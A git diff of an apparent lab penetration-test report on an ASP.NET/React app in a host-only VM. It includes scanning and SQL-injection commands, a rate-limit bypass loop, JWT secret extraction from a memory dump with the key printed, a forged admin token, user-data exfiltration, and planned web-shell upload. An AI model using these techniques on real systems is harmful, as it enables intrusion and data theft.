@@ -92,7 +92,7 @@ We conducted a passive and active fingerprinting phase to map the application's 
 |---|---|---|
 | **Frontend** | React SPA (Vite build) | Script reference analysis in HTML. |
 | **Backend API** | ASP.NET Core (net8.0) | Header and schema validation. |
-| **Database** | SQL-based Backend | API behavior mapping (Section 7.1). |
+| **Database** | SQL-based Backend | API behavior mapping (Section 9.1). |
 | **Server/Proxy** | IIS 10.0 | HTTP response header analysis. |
 | **Auth Mechanism** | JWT Bearer tokens | `WWW-Authenticate` header and `localStorage` audit. |
 | **Escenario Host** | Windows Server 2025 | Guest Properties (Hypervisor-level). |
@@ -172,7 +172,7 @@ strict-transport-security: max-age=3153600; includeSubDomains
     - **Inference:** Each frontend route with data-entry or list-views indicates a corresponding backend API endpoint. For example, the route `/users/create` in the SPA logic pointed us toward searching for a POST request to `/backend/api/users`.
 
 2.  **Stealth Dynamic Fuzzing (Authenticated):**
-    - Using the administrative JWT (see Section 4.5), we performed an authenticated scan with `ffuf` to verify the existence of the inferred backend endpoints.
+    - Using the administrative JWT (see Section 5.5), we performed an authenticated scan with `ffuf` to verify the existence of the inferred backend endpoints.
     - **Execution Command:**
     ```bash
     # Authenticated Fuzzing with 1s delay (T1046)
@@ -195,13 +195,46 @@ strict-transport-security: max-age=3153600; includeSubDomains
 - **Hidden Controllers:** Fuzzing for `/logs`, `/config`, `/env`, `/swagger`, and `/metrics` yielded no results, confirming the API surface is strictly limited to the functions required by the frontend.
 - **SPA Fallback:** We observed that non-existent paths on the root `/` return a `200 OK` with the React `index.html` (SPA fallback), which can lead to false positives in standard directory brute-forcing.
 
-- **SPA Fallback:** We observed that non-existent paths on the root `/` return a `200 OK` with the React `index.html` (SPA fallback), which can lead to false positives in standard directory brute-forcing.
+---
+
+## 3. Automated Vulnerability Assessment (MITRE T1595)
+
+To broaden the attack surface analysis beyond manual inspection, we employed several automated tools from the Kali Linux suite.
+
+### 3.1 Infrastructure Scanning: Nikto
+**Objective:** Identify web server misconfigurations and outdated components.
+
+**Command:**
+```bash
+nikto -h https://192.168.56.137 -ssl
+```
+
+**Key Findings:**
+- **Web Server:** Microsoft-IIS/10.0 detected.
+- **Header Analysis:** Confirmed `X-Powered-By: ASP.NET` and other standard IIS headers.
+- **Sensitive Files:** Identified `/JAMonAdmin.jsp`, but manual verification confirmed it is trapped by the SPA routing.
+- **SSL/TLS:** The server enforces valid HTTPS, which complicates man-in-the-middle attacks on the Host-Only network.
+
+### 3.2 Directory Enumeration: Gobuster / FFUF
+**Objective:** Discover hidden files, backups, or administrative directories.
+
+**Command:**
+```bash
+gobuster dir -u https://192.168.56.137/backend/ -w [WORDLIST] -k
+```
+
+**Key Findings:**
+- **API discovery:** Confirmed the presence of the `/backend/api` structure.
+- **Rate-Limit Interference:** Automated enumeration was significantly slowed by the application's rate-limiting middleware, which consistently returned `429` (or `RATE_LIMIT_EXCEEDED`) after roughly 5 requests.
+- **Conclusion:** Brute-forcing the directory structure is inefficient without a distributed IP pool or a valid rate-limit bypass.
 
 ---
 
-## 3. Authentication & Login Analysis
+## 4. Authentication & Logical Web Exploitation
 
-### 3.1 Unsuccessful Login Attempt (Baseline)
+**Objective:** Identify and exploit logical vulnerabilities in the application stack to achieve horizontal/vertical privilege escalation and Remote Code Execution (RCE).
+
+### 4.1 Unsuccessful Login Attempt (Baseline)
 Let's see what the application returns on a generic failed login.
 
 **Command:**
@@ -213,7 +246,7 @@ curl -k -X POST https://192.168.56.137/backend/api/auth/login -H "Content-Type: 
 {"success":false,"message":"Nombre de usuario o contraseña incorrectos.","errorCode":"AUTH_FAILED","timestamp":"2026-04-02T14:23:26.8527883Z"}
 ```
 
-### 3.2 SQL Injection Testing
+### 4.2 SQL Injection Testing (Manual)
 
 **Command:**
 ```bash
@@ -221,7 +254,24 @@ curl -k -X POST https://192.168.56.137/backend/api/auth/login -H "Content-Type: 
 ```
 **Result:** Returns standard `AUTH_FAILED`. No SQL injection vulnerability detected. The application likely uses parameterized queries (EF Core LINQ).
 
-### 3.3 Rate Limiting Analysis (MITRE T1110.003)
+### 4.3 Advanced API Injection: SQLMap (MITRE T1190)
+
+We utilized `sqlmap` to perform deep analysis on administrative user endpoints to identify potential blind or time-based injections.
+
+**Execution:**
+```bash
+sqlmap -u "https://192.168.56.137/backend/api/users/1" \
+       --header "Authorization: Bearer [ADMIN_JWT]" \
+       --batch --dbms mssql --level 3 --risk 2
+```
+
+**Observation:**
+The `{id}` parameter in the RESTful route `/users/{id}` appears to be strongly typed as an integer by the ASP.NET Core MVC framework.
+- **Result:** `sqlmap` was unable to find any injectable parameters. The server returns a structured `400 Bad Request` validation error for non-numeric input (e.g., `1'--`), preventing standard breakout.
+
+**Conclusion:** The primary user-retrieval API is hardened against direct SQL injection via route parameters.
+
+### 4.4 Rate Limiting Analysis (MITRE T1110.003)
 
 To test defenses against credential spraying, we automated multiple requests in a short frame.
 
@@ -241,13 +291,72 @@ bash -c "for i in {1..7}; do curl -s -k -X POST https://192.168.56.137/backend/a
 > [!WARNING]
 > Rate limiting triggers after roughly ~5 failed attempts. The limits appear IP-based, restricting standard brute-forcing without proxies or distributed IPs.
 
+### 4.5 Rate Limiting Bypass Investigation (MITRE T1110.003)
+
+As established in Section 4.4, the application implements a strict rate limit of ~5 attempts per IP. We attempted to bypass this restriction using common header spoofing techniques.
+
+**Techniques Tested:**
+- `X-Forwarded-For: [Random_IP]`
+- `X-Forwarded-Host: 127.0.0.1`
+
+**Execution:**
+```bash
+for i in {1..7}; do 
+  curl -sk -X POST https://192.168.56.137/backend/api/auth/login \
+       -H "X-Forwarded-For: 1.2.3.$i" \
+       -d '{"username":"admin","password":"wrongpassword"}'
+done
+```
+
+**Result:** The application continued to return `RATE_LIMIT_EXCEEDED` after the 5th attempt, indicating that the protection is enforced at the network/socket level or that the proxy-related headers are correctly ignored by the IIS middleware.
+
+### 4.6 Frontend Component Analysis (Static Logic)
+
+We performed a deep analysis of the production JavaScript bundle (`/assets/index-CYy1omQq.js`) to reconstruct the application's internal structure and security logic.
+
+**Key Findings:**
+1.  **API Surface Mapping:** The backend API is hosted at `https://192.168.56.137/backend/api`.
+2.  **Endpoint Discovery:**
+    - `POST /auth/login`: Authentication.
+    - `GET /auth/validate`: Token validation.
+    - `GET/POST /users`: User management (Admin).
+    - `GET/PUT/DELETE /users/{id}`: Detailed user operations.
+3.  **Client-Side "Security":**
+    - The code revealed a client-side filter for role management: `n("Admin") || delete y.role`.
+    - **Risk:** This suggests that the frontend simply deletes the `role` field from the JSON payload before sending the `PUT` request if the logged-in user is not an Admin. If the backend fails to perform this same check, a **Mass Assignment** vulnerability exists.
+
+### 4.7 Privilege Escalation: Mass Assignment Testing (MITRE T1078.004)
+
+We tested the identified vertical privilege escalation vector by attempting to promote a standard "Client" user to "Admin" using an authenticated session.
+
+**Execution:**
+- **Attacker User:** `eminem` (ID: 2, Role: Client).
+- **Target Action:** Self-promote to `Admin`.
+- **Request:**
+  ```bash
+  curl -sk -X PUT https://192.168.56.137/backend/api/users/2 \
+       -H "Authorization: Bearer [EMINEM_TOKEN]" \
+       -H "Content-Type: application/json" \
+       -d '{"username":"eminem", "email":"eminem@udc.es", "fullName":"Marshall Bruce Mathers", "role":"Admin"}'
+  ```
+
+**Result:**
+```json
+{
+  "success": true,
+  "message": "Usuario actualizado exitosamente.",
+  "data": { "id": 2, ..., "role": "Client" }
+}
+```
+**Conclusion:** The backend correctly ignores the `role` field when processed by a non-administrative token, or strictly validates the transition. No vertical privilege escalation via direct JSON manipulation was achieved.
+
 ---
 
-## 4. Exploit Chain: JWT Forging via Memory Analysis
+## 5. Exploit Chain: JWT Forging via Memory Analysis
 
 **Objective:** Bypass the application defenses by exploiting the underlying physical/hypervisor access to extract memory secrets.
 
-### 4.1 Memory Acquisition (MITRE T1003.001 - OS Credential Dumping)
+### 5.1 Memory Acquisition (MITRE T1003.001 - OS Credential Dumping)
 
 Due to hypervisor access, we performed a live memory dump of the target VM directly from the Host operating system.
 
@@ -257,7 +366,7 @@ Due to hypervisor access, we performed a live memory dump of the target VM direc
 ```
 **Result:** A 4.4 GB ELF core dump was generated in `c:\temp\csai_mem_new.elf`, containing the full physical memory of the running VM.
 
-### 4.2 Memory Dump Validation (Host-Based)
+### 5.2 Memory Dump Validation (Host-Based)
 
 Before attempting to extract secrets, we verified the integrity and content of the memory dump directly on the host using Python strings processing.
 
@@ -268,7 +377,7 @@ py -c "f=open(r'c:\temp\csai_mem_new.elf','rb'); d=f.read(1024*1024*500); print(
 ```
 **Result:** `True`. We confirmed the presence of the target database name and application-specific strings in the first 500MB of the dump.
 
-### 4.3 Reproducible Secret Extraction (Host-Based Analysis)
+### 5.3 Reproducible Secret Extraction (Host-Based Analysis)
 
 The most robust and reproducible method for extracting signing keys on the host machine involved using **Volatility 3** and custom Python orchestration to bridge the gap between memory offsets and application-level secrets.
 
@@ -338,7 +447,7 @@ if __name__ == "__main__":
 > [!IMPORTANT]
 > The successful extraction of the signing key directly from the host machine confirms that the hypervisor access provides a 100% reproducible discovery path for application-level secrets, bypassing all guest-level protections.
 
-### 4.4 Automated Key Validation
+### 5.4 Automated Key Validation
 
 To verify the candidates, we utilized a validation script that forges an administrative token for each candidate and attempts to access the protected `/users` endpoint.
 
@@ -386,10 +495,8 @@ def validate_candidates(file_path, target_url):
                     pass
                 else:
                     # Other status codes
-                    # print(f"Secret {secret} returned {response.status_code}")
                     pass
             except Exception as e:
-                # print(f"Error testing {secret}: {e}")
                 pass
                 
     except FileNotFoundError:
@@ -403,7 +510,7 @@ if __name__ == "__main__":
 **Result:**
 The key `CWgLnSB5JKpgba6BWyzwV8Uf+qDpErvjMPfpv9vIifg=` was successfully validated, returning a **200 OK** and granting full access to the user database.
 
-### 4.5 Token Forging (MITRE T1550.001 - Application Access Token)
+### 5.5 Token Forging (MITRE T1550.001 - Application Access Token)
 
 With the validated `SecretKey`, we forged a JWT to impersonate an administrator. Testing revealed that the application expects compact claim names (`sub`, `role`, `name`) rather than full XML schemas.
 
@@ -439,7 +546,7 @@ python3 forge_jwt.py --secret "CWgLnSB5JKpgba6BWyzwV8Uf+qDpErvjMPfpv9vIifg="
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwicm9sZSI6IkFkbWluIiwiaXNzIjoiU2VjdXJlV2ViQXBwIiwiYXVkIjoiU2VjdXJlV2ViQXBwQ2xpZW50IiwiZXhwIjoxNzc1MzI3OTQ0fQ.iNhlMpuPmy42WQbN5UKLW3CVS-e5TCwm3hTq_mACTKo
 ```
 
-### 4.6 Browser Session Takeover & UI Exploration (MITRE T1550.001, T1078)
+### 5.6 Browser Session Takeover & UI Exploration (MITRE T1550.001, T1078)
 
 Hemos demostrado con éxito la transición de un exploit técnico de API (falsificación de JWT) a un control total de la interfaz gráfica (GUI). Al inyectar las credenciales forjadas directamente en el almacenamiento persistente del navegador (`localStorage`), logramos eludir la pantalla de inicio de sesión y acceder al panel de administración como el usuario `ice_tea` (Administrator).
 
@@ -476,7 +583,7 @@ _Figura 3: Interfaz funcional para la creación de nuevos usuarios administrativ
 > [!IMPORTANT]
 > El éxito del secuestro de la interfaz gráfica confirma que cualquier atacante con la clave secreta de firma del servidor puede actuar como un "Usuario Dios" con control absoluto sobre la gestión de identidades de la aplicación.
 
-### 4.7 Data Exfiltration (MITRE T1020 - Automated Exfiltration)
+### 5.7 Data Exfiltration (MITRE T1020 - Automated Exfiltration)
 
 By injecting the forged Bearer token into HTTP requests, we bypassed all authentication controls, extracting the complete user database. The following script automates the full path from secret to database capture.
 
@@ -612,21 +719,20 @@ curl -s -k -H "Authorization: Bearer $TOKEN" https://192.168.56.137/backend/api/
 > [!IMPORTANT]
 > **7 user records exfiltrated**, including the administrator account. Complete takeover of the user database achieved without any valid credentials.
 
-
 ---
 
-## 5. Hardware & Hypervisor Assessment
+## 6. Hardware & Hypervisor Assessment
 
 **Objective:** Audit the physical and virtualization layer for potential exfiltration vectors and encryption status.
 
-### 5.1 Volumes & Encryption (MITRE T1489)
+### 6.1 Volumes & Encryption (MITRE T1489)
 The system implements **BitLocker Drive Encryption** using a **vTPM 2.0** (Virtual Trusted Platform Module).
 
 - **Algorithm:** AES-256 (Aes256 encryption method).
 - **Status:** Enabled (Confirmed via `CSAI.vbox` TPM status and Secure Boot configuration).
 - **Implication:** The virtual disk is protected at rest. Offline attacks against the `.vdi` would require a recovery key or the associated virtual metadata.
 
-### 5.2 Hypervisor Configuration Analysis (`.vbox`)
+### 6.2 Hypervisor Configuration Analysis (`.vbox`)
 | Setting | Value | Risk |
 |---|---|---|
 | **Clipboard** | ⚠️ **Bidirectional** | Data exfiltration (T1115) |
@@ -635,48 +741,48 @@ The system implements **BitLocker Drive Encryption** using a **vTPM 2.0** (Virtu
 
 ---
 
-## 6. System Hardening & Defensive Analysis 
+## 7. System Hardening & Defensive Analysis 
 
 Audit of the active defensive measures based on network behavior and hypervisor metadata.
 
-### 6.1 Hypervisor-Level Hardening
+### 7.1 Hypervisor-Level Hardening
 - **TPM 2.0:** The machine uses a virtual TPM, preventing simple offline password resets and mandating BitLocker for volume encryption.
 - **Boot Integrity:** EFI firmware and Secure Boot are enabled, preventing unsigned boot loaders.
 
-### 6.2 Application Defenses
-- **Rate Limiting:** Verified via automated requests (Section 3.3). 5 requests per IP threshold.
+### 7.2 Application Defenses
+- **Rate Limiting:** Verified via automated requests. 5 requests per IP threshold.
 - **CORS/CSP Policy:** Highly restrictive Content Security Policy found in the response headers.
 
 ---
 
-## 7. Credential & Data Storage Audit
+## 8. Credential & Data Storage Audit
 
 **Objective:** Identify the storage location and security of user credentials.
 
-### 7.1 Backend Persistence
+### 8.1 Backend Persistence
 - **Database Logic:** Confirmed SQL-based storage (via API response error mapping) typical of ASP.NET Core deployments. 
-- **Endpoint Analysis:** User records are served via the `/backend/api/users` endpoint (verified in Section 4.5).
+- **Endpoint Analysis:** User records are served via the `/backend/api/users` endpoint (verified in Section 5.5).
 
-### 7.2 Password Storage (MITRE T1552)
+### 8.2 Password Storage (MITRE T1552)
 - **Security:** Based on the .NET 8 stack and the use of the `Authorization: Bearer` (JWT) standard, it is highly probable that the application utilizes a standard hashing algorithm (e.g. PBKDF2) to store passwords in an internal SQL table.
 
 ---
 
-## 8. Additional Service & Info Disclosure Audits
+## 9. Additional Service & Info Disclosure Audits
 
-### 8.1 TLS/SSL Analysis (MITRE T1557)
+### 9.1 TLS/SSL Analysis (MITRE T1557)
 
 - **Certificate:** Self-signed (`CN=CSAI`), valid from 2026 to 2027.
 - **Protocols Supported:** TLSv1.2, TLSv1.3 (✅ Good), but **TLSv1.0 and TLSv1.1 are still enabled** (⚠️ Medium Risk: Vulnerable to POODLE/BEAST).
 - **Ciphers:** AES-CBC & AES-GCM.
 
-### 8.2 Information Disclosure
+### 9.2 Information Disclosure
 - Frontend JS Bundle (`/assets/index-CYy1omQq.js`) reveals: Complete API map, role system, crud logic, and backend URL structure.
 - **TraceIds** are leaked dynamically on 500/validation errors. 
 
 ---
 
-## 9. MITRE ATT&CK Summary 
+## 10. MITRE ATT&CK Summary 
 
 | Technique ID | Name | Phase | Status |
 |---|---|---|---|
@@ -694,7 +800,7 @@ Audit of the active defensive measures based on network behavior and hypervisor 
 
 ---
 
-## 10. Mitigations & Recommendations (Blue Team)
+## 11. Mitigations & Recommendations (Blue Team)
 
 ### 🔴 Critical Priorities
 
@@ -740,137 +846,7 @@ However, the server's security model's dependency on the underlying infrastructu
 
 ---
 
-## 11. Logical Security Audit & Web Exploitation
-
-**Objective:** Identify and exploit logical vulnerabilities in the application stack to achieve horizontal/vertical privilege escalation and Remote Code Execution (RCE).
-
-### 11.1 Frontend Component Analysis (Static Logic)
-
-We performed a deep analysis of the production JavaScript bundle (`/assets/index-CYy1omQq.js`) to reconstruct the application's internal structure and security logic.
-
-**Key Findings:**
-1.  **API Surface Mapping:** The backend API is hosted at `https://192.168.56.137/backend/api`.
-2.  **Endpoint Discovery:**
-    - `POST /auth/login`: Authentication.
-    - `GET /auth/validate`: Token validation.
-    - `GET/POST /users`: User management (Admin).
-    - `GET/PUT/DELETE /users/{id}`: Detailed user operations.
-3.  **Client-Side "Security":**
-    - The code revealed a client-side filter for role management: `n("Admin") || delete y.role`.
-    - **Risk:** This suggests that the frontend simply deletes the `role` field from the JSON payload before sending the `PUT` request if the logged-in user is not an Admin. If the backend fails to perform this same check, a **Mass Assignment** vulnerability exists.
-
-### 11.2 Privilege Escalation: Mass Assignment Testing (MITRE T1078.004)
-
-We tested the identified vertical privilege escalation vector by attempting to promote a standard "Client" user to "Admin" using an authenticated session.
-
-**Execution:**
-- **Attacker User:** `eminem` (ID: 2, Role: Client).
-- **Target Action:** Self-promote to `Admin`.
-- **Request:**
-  ```bash
-  curl -sk -X PUT https://192.168.56.137/backend/api/users/2 \
-       -H "Authorization: Bearer [EMINEM_TOKEN]" \
-       -H "Content-Type: application/json" \
-       -d '{"username":"eminem", "email":"eminem@udc.es", "fullName":"Marshall Bruce Mathers", "role":"Admin"}'
-  ```
-
-**Result:**
-```json
-{
-  "success": true,
-  "message": "Usuario actualizado exitosamente.",
-  "data": { "id": 2, ..., "role": "Client" }
-}
-```
-**Conclusion:** The backend correctly ignores the `role` field when processed by a non-administrative token, or strictly validates the transition. No vertical privilege escalation via direct JSON manipulation was achieved.
-
-### 11.3 Rate Limiting Bypass Investigation (MITRE T1110.003)
-
-As established in Section 3.3, the application implements a strict rate limit of ~5 attempts per IP. We attempted to bypass this restriction using common header spoofing techniques.
-
-**Techniques Tested:**
-- `X-Forwarded-For: [Random_IP]`
-- `X-Forwarded-Host: 127.0.0.1`
-
-**Execution:**
-```bash
-for i in {1..7}; do 
-  curl -sk -X POST https://192.168.56.137/backend/api/auth/login \
-       -H "X-Forwarded-For: 1.2.3.$i" \
-       -d '{"username":"admin","password":"wrongpassword"}'
-done
-```
-
-**Result:** The application continued to return `RATE_LIMIT_EXCEEDED` after the 5th attempt, indicating that the protection is enforced at the network/socket level or that the proxy-related headers are correctly ignored by the IIS middleware.
-
-### 11.5 SQL Injection Analysis: SQLMap (MITRE T1190)
-
-We utilized `sqlmap` to perform deep analysis on administrative user endpoints to identify potential blind or time-based injections.
-
-**Execution:**
-```bash
-sqlmap -u "https://192.168.56.137/backend/api/users/1" \
-       --header "Authorization: Bearer [ADMIN_JWT]" \
-       --batch --dbms mssql --level 3 --risk 2
-```
-
-**Observation:**
-The `{id}` parameter in the RESTful route `/users/{id}` appears to be strongly typed as an integer by the ASP.NET Core MVC framework.
-- **Result:** `sqlmap` was unable to find any injectable parameters. The server returns a structured `400 Bad Request` validation error for non-numeric input (e.g., `1'--`), preventing standard breakout.
-
-**Conclusion:** The primary user-retrieval API is hardened against direct SQL injection via route parameters.
-
----
-
-## 12. Automated Vulnerability Assessment (MITRE T1595)
-
-To broaden the attack surface analysis beyond manual inspection, we employed several automated tools from the Kali Linux suite.
-
-### 12.1 Infrastructure Scanning: Nikto
-**Objective:** Identify web server misconfigurations and outdated components.
-
-**Command:**
-```bash
-nikto -h https://192.168.56.137 -ssl
-```
-
-**Key Findings:**
-- **Web Server:** Microsoft-IIS/10.0 detected.
-- **Header Analysis:** Confirmed `X-Powered-By: ASP.NET` and other standard IIS headers.
-- **Sensitive Files:** Identified `/JAMonAdmin.jsp`, but manual verification (Section 11.4) confirmed it is trapped by the SPA routing.
-- **SSL/TLS:** The server enforces valid HTTPS, which complicates man-in-the-middle attacks on the Host-Only network.
-
-### 12.2 Directory Enumeration: Gobuster / FFUF
-**Objective:** Discover hidden files, backups, or administrative directories.
-
-**Command:**
-```bash
-gobuster dir -u https://192.168.56.137/backend/ -w [WORDLIST] -k
-```
-
-**Key Findings:**
-- **API discovery:** Confirmed the presence of the `/backend/api` structure.
-- **Rate-Limit Interference:** Automated enumeration was significantly slowed by the application's rate-limiting middleware, which consistently returned `429` (or `RATE_LIMIT_EXCEEDED`) after roughly 5 requests.
-- **Conclusion:** Brute-forcing the directory structure is inefficient without a distributed IP pool or a valid rate-limit bypass.
-
-### 12.3 Advanced API Injection: SQLMap
-**Objective:** Detect sophisticated SQL injection vulnerabilities in the administrative backend.
-
-**Command:**
-```bash
-sqlmap -u "https://192.168.56.137/backend/api/users/1" \
-       --header "Authorization: Bearer [ADMIN_JWT]" \
-       --batch --dbms mssql --level 3 --risk 2
-```
-
-**Results:**
-- **Parameter Analysis:** The ID parameter (`1`) was tested for Boolean-based, Error-based, and Time-based injections.
-- **Endpoint Response:** The server consistently returned regular JSON responses or structured validation errors for non-numeric input.
-- **Finding:** No SQL injection vulnerability was identified on the primary user-management endpoint. The backend appears to use strongly-typed models (ASP.NET Core) that sanitize route parameters before processing.
-
----
-
-## 13. Current Status & Pending Vectors
+## 12. Current Status & Pending Vectors
 
 The audit is now focused on finding the **File Upload** vulnerability explicitly mentioned in the requirements.
 
@@ -879,4 +855,3 @@ The audit is now focused on finding the **File Upload** vulnerability explicitly
 - **Search for Legacy Upload Points:** Target likely paths such as `/backend/api/media` or `/backend/upload`.
 - **RCE Attempt:** Once an upload point is found, attempt to bypass extension filtering to upload a web shell.
 - **Metasploit Post-Exploitation:** Use automated modules for local privilege escalation once a shell is established.
-
